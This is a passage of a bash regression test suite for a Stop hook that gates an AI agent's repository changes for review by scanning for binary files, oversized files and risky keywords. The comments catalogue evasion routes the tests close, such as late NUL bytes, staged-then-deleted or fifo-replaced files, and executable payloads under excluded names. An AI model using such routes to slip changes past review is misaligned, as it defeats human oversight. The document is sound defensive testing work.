git checkout -q -- blob.bin
# ...and it is the CONTENT that decides, not the file being untracked. An
# untracked text file carrying no keyword is unaffected.
printf 'ordinary notes, nothing interesting\n' > payload.txt
check ALLOW "an untracked text file is unaffected"
rm -f payload.txt

# A BOUNDED PREFIX SNIFF IS NOT BINARY DETECTION. git decides on a blob's first
# 8000 bytes and this gate read one 8192 character window, so the same payload
# behind enough padding read as text in BOTH legs: git renders ordinary added
# lines with no binary section, bash strips the NUL out of the captured diff, and
# awk sees a keyword-free file. Both were reproduced before this fixture existed.
{ head -c 9000 /dev/zero | tr '\0' 'x'; printf '\000\001\002secretpayload\000'; } > late.bin
check ALLOW "an untracked binary whose first NUL is past the sniff window is still classified"
says late.bin "$(notice)" "the notice must name the late-NUL untracked path"
git add late.bin
# The premise, asserted rather than assumed: git itself calls this content text,
# so the tracked leg cannot lean on git having spotted it.
if git diff HEAD --binary -- late.bin | grep -q '^GIT binary patch$'; then
  fail=$((fail + 1)); printf '  FAIL test premise: git already renders the late-NUL file as a binary patch\n'
else
  pass=$((pass + 1))
fi
check ALLOW "the same bytes tracked are binary however git rendered them"
says late.bin "$(notice)" "the notice must name the late-NUL tracked path"
git rm -q --cached late.bin
rm -f late.bin

# ...and the classification follows the INDEX when the two disagree. The sniff reads
# bytes on disk, so `git add` an artifact and then delete the worktree copy left
# nothing to read: git renders the staged blob as ordinary added lines, the disk
# holds no file, and the staged bytes a plain `git commit` would ship went
# unclassified.
{ head -c 9000 /dev/zero | tr '\0' 'x'; printf '\000\001\002secretpayload\000'; } > staged.bin
git add staged.bin
rm -f staged.bin
check ALLOW "a staged binary whose worktree copy is gone is classified from the index"
says staged.bin "$(notice)" "the notice must name the staged binary path"
git rm -q --cached staged.bin
# ...and an ordinary staged text edit rewritten in the worktree is not a finding, so
# the index read is about the bytes rather than about a path being staged twice.
printf 'ordinary notes\n' > staged.txt
git add staged.txt
printf 'ordinary notes, edited after staging\n' > staged.txt
check ALLOW "a staged text file edited again in the worktree is not a binary finding"
git reset -q HEAD -- staged.txt
rm -f staged.txt
# THE EXCLUSION CLAIM READ THE WORKTREE COPY TOO. `*.md` is excluded because prose
# does not execute, and the hook checks that per file against the bytes on disk, so
# staging an executable shebang payload and restoring the worktree copy to prose
# left the claim holding over a file with nothing to do with what would ship.
printf '# Notes\n' > claim.md
git add claim.md
git commit -qm claim
printf '#!/bin/sh\ncharge_the_card # billing\n' > claim.md
chmod +x claim.md
git add claim.md
git show HEAD:claim.md > claim.md
chmod -x claim.md
check BLOCK "a staged executable payload under an excluded name is not spared by an inert worktree copy"
# ...and it is the staged MODE and shebang that revoke it, not the file being staged
# at all: ordinary prose keywords staged the same way are still excluded.
printf 'Billing and oauth changes need an independent review.\n' > claim.md
git add claim.md
git show HEAD:claim.md > claim.md
check ALLOW "staged prose under an excluded name is still excluded"
git reset -q HEAD -- claim.md
git rm -q claim.md
git commit -qm "drop the claim fixture"

# ...and an UNMERGED path is not an unreadable one. It has no stage 0, so the index
# read fails, and `git commit` refuses while the conflict is open: there is nothing
# staged to ship and nothing to classify. Reading that failure as unclassifiable
# blocked every stop in the middle of a merge.
main_branch="$(git rev-parse --abbrev-ref HEAD)"
printf 'one\n' > conflict.txt
git add conflict.txt
git commit -qm conflict-base
git checkout -qb conflict-side
printf 'two\n' > conflict.txt
git commit -qam conflict-side
git checkout -q "$main_branch"
printf 'three\n' > conflict.txt
git commit -qam conflict-main
git merge conflict-side >/dev/null 2>&1
if [ -n "$(git ls-files -u -- conflict.txt)" ]; then
  pass=$((pass + 1))
else
  fail=$((fail + 1)); printf '  FAIL test premise: the fixture left no unmerged path\n'
fi
check ALLOW "an unresolved merge conflict over benign content is not a finding"
git merge --abort
git branch -D conflict-side >/dev/null
git rm -q conflict.txt
git commit -qm "drop the conflict fixture"

# A FILE THE SCAN CANNOT FINISH IS NOT TEXT EITHER. The scan is bounded so one
# multi-gigabyte artifact cannot hold up a Stop hook, and past that bound the
# classification is undecided. Undecided is announced, not blocked: a generated
# report or a data dump over the bound is the most ordinary large file there is,
# and blocking it was the same false positive the binary cases carry.
head -c 1200000 /dev/zero | tr '\0' 'x' > wide.dat
check ALLOW "a file too large to classify inside the scan bound is not assumed to be text"
says "could not be classified" "$(notice)" "an undecided file must say it could not be classified"
says wide.dat "$(notice)" "the notice must name the undecided path"
rm -f wide.dat
# ...and an ordinary text file inside the bound still reads as text, so the bound
# is a bound on work rather than a rule that every large file blocks.
head -c 600000 /dev/zero | tr '\0' 'x' > narrow.dat
check ALLOW "a keyword-free text file inside the scan bound still allows"
rm -f narrow.dat

# THE BOUND IS ONE MEBIBYTE AND THE EDGE IS ON IT. The scan reads sixteen 65536
# byte windows, and reporting undecided the moment the sixteenth one filled called
# an exactly 1 MiB NUL-free file unclassifiable although every one of its bytes had
# been read and none was a NUL. The comments promise undecided only ABOVE the
# bound, so one probe byte now tells "the file ended here" from "there is more".
head -c 1048575 /dev/zero | tr '\0' 'x' > edge.dat
check ALLOW "one byte under the bound is text"
head -c 1048576 /dev/zero | tr '\0' 'x' > edge.dat
check ALLOW "exactly the bound is text, because every byte of it was read"
head -c 1048577 /dev/zero | tr '\0' 'x' > edge.dat
check ALLOW "one byte over the bound is undecided, which is announced"
says "could not be classified" "$(notice)" "the over-bound file must say it could not be classified"
says edge.dat "$(notice)" "the notice must name the over-bound path"
# ...and the probe reads content, not just length: a NUL sitting exactly at the
# bound is still a NUL, so the file is reported as binary rather than undecided.
{ head -c 1048576 /dev/zero | tr '\0' 'x'; printf '\000payload'; } > edge.dat
check ALLOW "a NUL at the first byte past the bound is binary, not undecided"
says "binary file was added" "$(notice)" "a NUL at the bound reads as binary rather than undecided"
rm -f edge.dat

# An unreadable or keyword-less rules file fails CLOSED: an empty list matches
# nothing, and a scan that matches nothing calls every tree benign in silence.
# Asserted over a docs-only tree, which allows under the shipped rules, so the
# block can only come from the fallback dropping every narrowing with the list.
printf '# Notes\n\nBilling and oauth changes need an independent review.\n' > GUIDE.md
check ALLOW "the docs-only tree allows while the rules file is readable"
rules "" 'keywords = []'
check BLOCK "an empty keyword list still blocks rather than passing everything"
empty_reason="$(reason)"
case "$empty_reason" in
  *"could not be read or define no keywords"*) pass=$((pass + 1)) ;;
  *) fail=$((fail + 1)); printf '  FAIL an empty keyword list must say the rules file could not be read :: %s\n' "$empty_reason" ;;
esac
# The fallback list is the shipped one, not an empty regex dressed up: a benign
# tree under the same broken rules file must still allow, or the block above is
# just "the rules file is broken" and says nothing about the code.
git checkout -q -- GUIDE.md
printf 'ordinary notes\n' > plain.md
check ALLOW "a benign tree under the same broken rules file still allows"
rm -f plain.md
no_rules

# EVERY ROW OF THE MARKER TABLE OWES A PROOF THAT ITS MARKER CANNOT BE EXECUTABLE
# SYNTAX. Three rows could not give one and are gone; two were audited and kept,
# because removing them would trade a narrow miss for a broad false positive.
mkdir -p tbl
printf 'package main\n' > tbl/cgo.go
printf 'int main() { return 0; }\n' > tbl/plain.c
printf 'key = 1\n' > tbl/app.cfg
printf 'key 1\n' > tbl/app.conf
printf 'x(1).\n' > tbl/app.pl
printf 'package X;\n' > tbl/app.pm
printf 'key: 1\n' > tbl/app.yml
printf 'a { color: red }\n' > tbl/app.css
git add tbl
git commit -qm tbl

# A GO BLOCK COMMENT CAN BE COMPILED C. The preamble above `import "C"` is C source
# handed to cgo, so the marker proves nothing about that line. Its continuation
# lines already scan, because `*` opens nothing and is in no marker set, and a
# comment that closes on its own line already scans too: the opener was the one line
# left.
printf 'package main\n\n/* #define AUTHZ_DISABLED 1\n*/\nimport "C"\n' > tbl/cgo.go
check BLOCK "the opening line of a Go block comment is scanned, because cgo compiles it"
git checkout -q -- tbl/cgo.go
# ...and the rest of the C family keeps the exclusion, so this is about Go rather
# than about block comments having been dropped. Scanning the opener of every
# multi-line comment in every C-family file is a broad false positive for nothing.
printf 'int main() { return 0; }\n/* billing goes here later\n*/\n' > tbl/plain.c
check ALLOW "an unclosed C block comment opener is still skipped"
git checkout -q -- tbl/plain.c
# ...and a Go comment whose opener carries no keyword still costs nothing, which is
# what bounds the trade to the opener line.
printf 'package main\n\n/*\nPackage notes, nothing here.\n*/\n' > tbl/cgo.go
check ALLOW "a Go block comment whose opening line carries no keyword still allows"
git checkout -q -- tbl/cgo.go

# `.cfg` and `.conf` name a PURPOSE rather than a language, so nothing about their
# syntax is known, and `.pl` is Perl and Prolog, where the comment marker is `%` and
# `#` is not comment syntax at all.
printf 'key = 1\n# billing goes here later\n' > tbl/app.cfg
check BLOCK "a hash line in .cfg is scanned, because the extension names a purpose"
git checkout -q -- tbl/app.cfg
printf 'key 1\n# billing goes here later\n' > tbl/app.conf
check BLOCK "a hash line in .conf is scanned for the same reason"
git checkout -q -- tbl/app.conf
printf 'x(1).\n# billing goes here later\n' > tbl/app.pl
check BLOCK "a hash line in .pl is scanned, because Prolog comments with % and not #"
git checkout -q -- tbl/app.pl
# ...and `.pm` names one language, so the removals are about ambiguity rather than
# about `#` having been dropped.
printf 'package X;\n# billing goes here later\n' > tbl/app.pm
check ALLOW "a Perl module comment is still skipped"
git checkout -q -- tbl/app.pm
# The two rows that were kept. A `#` line inside a YAML block scalar is document
# data rather than YAML syntax, but reaching it needs a consumer that reads `#` as
# code, and dropping the row costs every comment in every pipeline file. CSS really
# does comment with `/* */`; the `//` half of that marker set matches nothing CSS
# executes.
printf 'key: 1\n# billing goes here later\n' > tbl/app.yml
check ALLOW "a YAML comment is still skipped"
git checkout -q -- tbl/app.yml
printf 'a { color: red }\n/* billing goes here later\n*/\n' > tbl/app.css
check ALLOW "a CSS block comment is still skipped"
git checkout -q -- tbl/app.css

# THE EXECUTABLE BIT IS A CLAIM THE FILESYSTEM MAKES, AND SOME FILESYSTEMS MAKE IT
# FOR EVERYTHING. FAT, many network mounts and a permissive umask all report every
# file executable, and reading the bit there revokes every prose exclusion at once:
# the gate then fires on documentation, which is the false positive that nearly
# killed it. git writes .git/HEAD without the bit, so a tree reporting HEAD
# executable is reporting noise rather than a program.
printf 'Billing and oauth changes need an independent review.\n' > flood.md
chmod +x flood.md
check BLOCK "an executable markdown file is scanned while the mode bit means something"
chmod +x "$TMP/.git/HEAD"
check ALLOW "...and is excluded again where the filesystem marks everything executable"
# ...and the INDEX MODE still revokes the exclusion there, because 100755 is what a
# commit ships and no filesystem can fake it.
git add flood.md
check BLOCK "a staged 100755 mode revokes the exclusion whatever the filesystem says"
git rm -q --cached flood.md
chmod -x "$TMP/.git/HEAD"
rm -f flood.md

# THE STAGED BYTES ARE WHAT A PLAIN `git commit` SHIPS. The staged read only runs
# for a path BOTH hops name, on the reasoning that a path named once differs in one
# place; that fails when the worktree hop cannot report the path at all. A tracked
# path whose worktree copy is a fifo is dropped from that hop, so the unscannable
# blob staged under it was named once and classified from a file that is not there.
# The sandbox creates this shape by bind mounting /dev/null over deny-listed paths.
{ head -c 9000 /dev/zero | tr '\0' 'x'; printf '\000\001\002secretpayload\000'; } > payment_blob.dat
git add payment_blob.dat
rm -f payment_blob.dat
mkfifo payment_blob.dat
check BLOCK "a staged unscannable blob under a fifo path is classified from the index"
says payment_blob.dat "$(reason)" "the block must name the risky staged path"
rm -f payment_blob.dat
git rm -q --cached payment_blob.dat

# AND THE EXCLUSION IS DECIDED AGAINST THOSE SAME STAGED BYTES. `*.md` is excluded
# because prose does not execute, and the claim was tested against the worktree
# copy: a fifo is not a regular file, so the check returned "not my business, the
# exclusion stands" and the path was dropped from the scan on the strength of its
# name. It is the shape above one step further on, and it is worse, because the
# staged blob is never even classified: the path is dropped from BOTH hops of the
# reduced diff, so committed-and-staged content a plain `git commit` ships was
# scanned nowhere. A narrowing must prove a property, and a copy that cannot be
# read has proven nothing.
printf '# Notes\n' > doc2.md
git add doc2.md
git commit -qm doc2
printf '#!/bin/sh\ncharge_the_card # billing payment\n' > doc2.md
git add doc2.md
rm -f doc2.md
mkfifo doc2.md
check BLOCK "a staged shebang payload under a fifo .md is scanned despite the exclusion"
# ...and the INDEX MODE answers there too, so the shebang is not the only claim the
# staged copy makes about itself.
rm -f doc2.md
git checkout -q -- doc2.md
printf 'Billing and payment prose, no shebang.\n' > doc2.md
chmod +x doc2.md
git add doc2.md
rm -f doc2.md
mkfifo doc2.md
check BLOCK "a staged 100755 mode under a fifo .md is scanned despite the exclusion"
# THE CONTROL. The same shape with inert staged prose stays excluded: reading the
# index must not turn every document under an unreadable worktree copy into a
# finding, which is the false positive that nearly killed this gate.
rm -f doc2.md
git checkout -q -- doc2.md
chmod -x doc2.md
printf 'Billing, oauth and payment changes need an independent review.\n' > doc2.md
git add doc2.md
rm -f doc2.md
mkfifo doc2.md
check ALLOW "inert staged prose under a fifo .md is still excluded"
rm -f doc2.md
git checkout -q -- doc2.md
git reset -q
# ...and a DELETION of the same document is not promoted into a finding by that
# read either, staged or not: the index ships nothing new, and removed content
# executes nowhere.
git rm -q --cached doc2.md
rm -f doc2.md
check ALLOW "a staged deletion of a risky-worded .md is not a finding"
git reset -q
git checkout -q -- doc2.md
rm -f doc2.md
check ALLOW "an unstaged deletion of that same .md is not a finding either"
git checkout -q -- doc2.md
# ...and it is the INDEX SHIPPING NOTHING NEW that spares the deletion, not the
# added-lines rule hiding it. With every line scanned, reading the base copy back
# for a deleted document is what turns `rm` of a shipped install guide into a
# review demand.
printf '#!/bin/sh\necho billing\n' > exec2.md
chmod +x exec2.md
git add exec2.md
git commit -qm exec2
chmod -x exec2.md
rm -f exec2.md
rules "" 'added_lines_only = "false"'
check ALLOW "deleting a committed executable .md is not a finding under a whole-diff scan"
no_rules
git checkout -q -- exec2.md
git rm -q exec2.md doc2.md
git commit -qm "drop the exclusion fixtures"
# ...and an ordinary deletion is not promoted into a finding by that read: the index
# holds nothing to ship, and removed content executes nowhere.
{ head -c 9000 /dev/zero | tr '\0' 'x'; printf '\000\001\002secretpayload\000'; } > payment_gone.dat
git add payment_gone.dat
git commit -qm "a risky-named binary to delete"
git rm -q --cached payment_gone.dat
rm -f payment_gone.dat
check ALLOW "deleting a risky-named unscannable file is not a finding"
git reset -q --hard HEAD >/dev/null
git rm -q payment_gone.dat
git commit -qm "drop the deletion fixture"

# THE WINDOW BOUND IS BYTES, NOT CHARACTERS. `read -n` counts CHARACTERS, so under a
# multibyte locale the mebibyte bound this scan promises is up to four mebibytes of
# reading and a file well past it classifies as text. The fixture is 1.5 MiB of
# two-byte characters: 786000 characters, under the bound counted as characters and
# over it counted as bytes.
utf8_locale=""
for l in C.utf8 C.UTF-8 en_US.utf8 en_US.UTF-8; do
  if locale -a 2>/dev/null | grep -qx "$l"; then utf8_locale="$l"; break; fi
done
if [ -n "$utf8_locale" ]; then
  awk 'BEGIN{s="";for(i=0;i<1000;i++)s=s "\303\251"; for(i=0;i<786;i++) printf "%s", s}' > wide.utf8
  mb_notice="$(printf '{"stop_hook_active":false,"transcript_path":"%s","permission_mode":"default"}' "$TR" \
    | env LC_ALL="$utf8_locale" bash "$HOOK" 2>/dev/null | jq -r '.systemMessage // ""' 2>/dev/null)"
  says "could not be classified" "$mb_notice" "an over-bound multibyte file must not read as text under a UTF-8 locale"
  says wide.utf8 "$mb_notice" "the notice must name the over-bound multibyte path"
  rm -f wide.utf8
else
  # Said out loud, because a lower pass count is otherwise the only sign that a
  # machine with no UTF-8 locale dropped the case.
  printf '  SKIP no UTF-8 locale installed: the byte-bound case (2 assertions)\n'
fi

echo "== $pass passed, $fail failed =="
[ "$fail" -eq 0 ]
